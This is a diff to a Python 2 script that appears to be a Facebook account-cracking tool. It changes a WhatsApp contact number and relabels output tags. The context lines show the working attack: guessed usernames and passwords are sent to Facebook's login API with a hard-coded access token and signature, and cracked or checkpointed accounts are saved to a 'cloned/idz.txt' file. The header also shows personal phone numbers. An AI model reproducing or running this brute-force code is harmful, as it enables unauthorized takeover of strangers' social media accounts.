@@ -111,7 +111,7 @@ print """
 \033[1;93m   |                                           |
 \033[1;93m   |Github:  https://github.com/Chamkani17|
 \033[1;93m   |                                           |
-\033[1;93m   |WhatsApp:           +923168823296
+\033[1;93m   |WhatsApp:           +923179853474
 \033[1;93m   |                                           |
 \033[1;93m   ╚═══════════════════════════════════════════╝    
 
@@ -294,13 +294,13 @@ def automatic():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;92m[Active]    ' + k + c + user + '  \x1b[1;97m|  ' + pass1
+                print '\x1b[1;92m[SYEDRAHIM]    ' + k + c + user + '  \x1b[1;97m|  ' + pass1
                 okb = open('cloned/idz.txt', 'a')
                 okb.write(k + c + user + pass1 + '\n')
                 okb.close()
                 oks.append(c + user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;95m[In-Active] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass1
+                print '\x1b[1;95m[SYEDRAHIM] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass1
                 cps = open('cloned/idz.txt', 'a')
                 cps.write(k + c + user + pass1 + '\n')
                 cps.close()
@@ -316,7 +316,7 @@ def automatic():
                     okb.close()
                     oks.append(c + user + pass2)
                 elif 'www.facebook.com' in q['error_msg']:
-                    print '\x1b[1;95m[In-Active] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass2
+                    print '\x1b[1;95m[SYEDRAHIM] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass2
                     cps = open('cloned/idz.txt', 'a')
                     cps.write(k + c + user + pass2 + '\n')
                     cps.close()
@@ -388,7 +388,7 @@ def own():
                 okb.close()
                 oks.append(c + user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;95m[In-Active] \x1b[1;97m' + k + c + user + ' \x1b[1;97m|  ' + pass1
+                print '\x1b[1;95m[SYEDRAHIM] \x1b[1;97m' + k + c + user + ' \x1b[1;97m|  ' + pass1
                 cps = open('cloned/idz.txt', 'a')
                 cps.write(k + c + user + pass1 + '\n')
                 cps.close()
